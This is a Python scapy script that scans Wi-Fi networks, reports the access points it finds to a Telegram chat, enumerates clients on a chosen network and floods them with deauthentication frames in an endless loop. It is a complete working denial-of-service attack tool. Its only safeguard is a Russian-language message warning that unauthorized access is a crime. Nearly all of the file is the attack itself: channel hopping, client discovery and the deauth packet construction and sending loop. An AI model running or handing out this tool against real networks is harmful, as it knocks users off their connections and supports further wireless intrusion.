from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11EltDSSSet, Dot11QoS, Dot11CCMP, Dot11Deauth, Dot11ProbeResp, RadioTap
from scapy.sendrecv import sniff
from scapy.all import conf, sendp
from bot import start
import secrets
import time
import subprocess
import threading
import csv

admin_chat_id='input here'
channels = [1,2,3,4,5,6,7,8,9,10,11,12,13]
IFACE = 'input here'
conf.iface = IFACE
activeFlag = True


def SystemCommand(command):
    subprocess.run(command,
                       shell=True, 
                       stdout=subprocess.PIPE, 
                       stderr=subprocess.PIPE,
                       check=True,
                       text=True)

# Channel hopper function

def ChannelHopper():
    while True:
        if not(activeFlag):
            break
        channel = secrets.choice(channels)
        command = f"sudo iw dev {IFACE} set channel {channel}"
        SystemCommand(command)
        if not(activeFlag):
            break
        time.sleep(0.2)


def mac_with_manufacturer(mac):
    first_6_bytes_of_mac = mac[:8]

    with open('mac_list.csv', 'r') as csv_file:
        mac_with_manufacturer = None
        reader = csv.reader(csv_file, delimiter='	')
        for row in reader:
            if first_6_bytes_of_mac.upper() in row:
                manufacturer = row[1]
                mac_with_manufacturer = manufacturer + '_' + mac[9:]
                return mac_with_manufacturer
        if mac_with_manufacturer is None:
            return mac
    


mainArray = []
 
SSIDCounter = 0

def handler(packet):
     # Sniffing for beacon frames / for access points
    if (packet.haslayer(Dot11Beacon)) or (packet.haslayer(Dot11ProbeResp)):
        dot11_layer = packet.getlayer(Dot11)
        mac = mac_with_manufacturer(dot11_layer.addr2) # we have the mac id
        if packet.haslayer(Dot11Beacon):
            beacon_frame = packet.getlayer(Dot11Beacon)
            name = beacon_frame.payload.info.decode('utf-8') # we have the name now
        if packet.haslayer(Dot11ProbeResp):
            proberesp_frame = packet.getlayer(Dot11ProbeResp)
            name = proberesp_frame.payload.info.decode('utf-8')
        dss_layer = packet.getlayer(Dot11EltDSSSet)
        channel = dss_layer.channel # now we have channel number
        '''
        syntax of data:
                [name, mac id, channel number]
        '''
        data = [name, mac, channel]
        if (data not in mainArray):
            mainArray.append(data)
            global SSIDCounter
            print(name)
            if SSIDCounter == 0:
                text = "Выберите сеть Wi-Fi, к которой вам разрешен доступ для сканирования." \
                "Обращаем ваше внимание, что несанкционированный доступ к сети влечет за собой уголовную ответственность (статья 349 УК РБ и статья 272 УК РФ).\n"
                first_message = start(chat_id=admin_chat_id, text=text, message_id=None)
            start(chat_id=admin_chat_id, message_id = first_message.message_id, text=text+f"{SSIDCounter}. {name} ({mac}) CH:{channel}\n")
            SSIDCounter += 1
            

hopperThread = threading.Thread (target = ChannelHopper)
hopperThread.start() # start of the channel hopper thread

sniff(prn = handler) # ctrl + c

activeFlag = False # stop the channel hopper thread


choice = int(input("\nВведите номер сети для сканирования"))

NAME = mainArray[choice -1][0]
MAC = mainArray[choice - 1][1]
CHANNEL = mainArray[choice - 1][2]

SystemCommand(command=f'sudo iw dev {IFACE} set channel {CHANNEL}')

print(f"Сканирование {NAME} (MAC:{MAC}) на канале {CHANNEL}")

clientsArray = []
clientCounter = 0

def addClient(network, client):
    global clientCounter
    if ((network == MAC) and (client not in clientsArray)):
            clientsArray.append(client)
            clientCounter += 1
            client_with_oui = mac_with_manufacturer(client)
            print("#", str(clientCounter), f"{client_with_oui} ({client})")


def clientHandler(packet):
    dot11 = packet.getlayer(Dot11)
    # null frame
    if (dot11.subtype == 4):
        '''
        addr1 = mac id of the network
        while addr2 = mac id of the client
        '''
        network = dot11.addr1
        client = dot11.addr2

        addClient(network, client)
    # control block frame
    elif (dot11.subtype == 9):
        '''
        addr2 = mac id of the network
        addr1 = mac id of the client
        '''
        network = dot11.addr2
        client = dot11.addr1
        addClient(network, client)
    # qos frame
    elif (packet.haslayer(Dot11QoS)):
        if not(packet.haslayer(Dot11CCMP)):
            # generic qos frame without ccmp
            '''
            addr1 = network
            addr2 = client
            '''
            network = dot11.addr1
            client = dot11.addr2
            addClient(network, client)
        else:
        # this is a packet with CCMP cipher
            '''
            addr1 = client
            addr2 = network
            '''
            network = dot11.addr2
            client = dot11.addr1
            addClient(network, client)



sniff (prn = clientHandler)

option = int(input("Введите устройство для деаутентификации (-1 для всех)"))

if not (option == -1):
    clientsArray = [clientsArray[option-1]]
while True:
    for client in clientsArray:
        packet = RadioTap() / Dot11 (addr1=client, addr2 = MAC, addr3=MAC) / Dot11Deauth()
        sendp(packet)


'''
deauth packet:
radiotap layer / dot11 layer (addr1= client, 2 = MAC, 3 = MAC) / Dot11Deauth()
sendp(packet) -> send this packet to layer 2, which we want 
send(packet) -> layer 3
'''
